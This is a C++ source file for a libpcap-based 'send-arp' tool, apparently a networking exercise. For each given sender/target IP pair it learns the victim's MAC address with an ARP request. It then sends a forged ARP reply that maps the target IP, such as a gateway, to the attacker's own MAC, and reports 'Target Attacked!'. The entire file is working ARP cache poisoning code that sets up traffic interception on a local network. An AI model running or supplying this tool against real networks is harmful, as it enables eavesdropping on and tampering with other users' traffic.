#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

pcap_t* handle;
void usage() { printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\nsend-arp wlan0 192.168.10.2 192.168.10.1\n"); }

int GetMacAddr(const char* interface, uint8_t* mac_addr){
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("socket() FAILED\n");
		return -1;
	}

	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("ioctl() FAILED\n");
		close(sockfd);
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6); // mac addr len
	close(sockfd);

	return 0;
}

int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest)
{
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ =  Ip::Size;
	if(isRequest) packet.arp_.op_ = htons(ArpHdr::Request);
	else packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip); 
    packet.arp_.tmac_ = tmac; 
    packet.arp_.tip_ = htonl(tip); 
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    return res;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || (argc%2)!=0) {
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	uint8_t my_mac[6];
	GetMacAddr(dev, my_mac);

	EthArpPacket packet;
	for(int i=1;i<argc/2;i++){
		send_packet_arp(Mac("ff:ff:ff:ff:ff:ff"),Mac(my_mac),Mac::nullMac(),Ip("0.0.0.0"),Ip(argv[2*i]),true);

		struct pcap_pkthdr* header;
		const u_char* rcvpacket;
		PEthHdr ethernet_hdr;
		PArpHdr arp_hdr;
		while(true){ 
			int res = pcap_next_ex(handle, &header, &rcvpacket);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

			ethernet_hdr = (PEthHdr)rcvpacket;
			uint16_t eth_type = ethernet_hdr->type();
			if(eth_type == EthHdr::Arp){

				rcvpacket += sizeof(struct EthHdr);
				arp_hdr = (PArpHdr)rcvpacket;
				if (static_cast<uint32_t>(arp_hdr->sip()) == static_cast<uint32_t>(Ip(argv[2 * i]))) break;
			}
		}
		Mac sender_mac = arp_hdr->smac();
		if(send_packet_arp(Mac(sender_mac),Mac(my_mac),Mac(sender_mac),Ip(argv[2*i+1]),Ip(argv[2*i]),false)==0){
			printf("Target %d Attacked!\n", i);
		}
	}
	pcap_close(handle);
}
